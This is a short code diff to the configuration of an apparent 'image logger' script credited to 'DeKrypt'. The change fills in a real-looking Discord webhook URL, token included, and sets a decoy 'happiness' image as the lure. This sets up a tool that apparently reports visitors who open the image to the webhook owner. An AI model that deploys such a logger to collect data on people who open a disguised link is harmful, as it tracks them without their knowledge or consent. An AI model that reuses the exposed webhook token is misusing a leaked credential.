@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1350964342971043942/AQYzgD8jRNAeZqLn8R3UNAuZjwY_eI6fd-lr9LuWKE6at86MNfpfdsQdg98GoxifgMVk",
+    "image": "https://www.happiness.com/community/uploads/monthly_2021_02/follow-your-bliss-happiness.jpg.50f158564166ac243bbc88809e27ac52.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
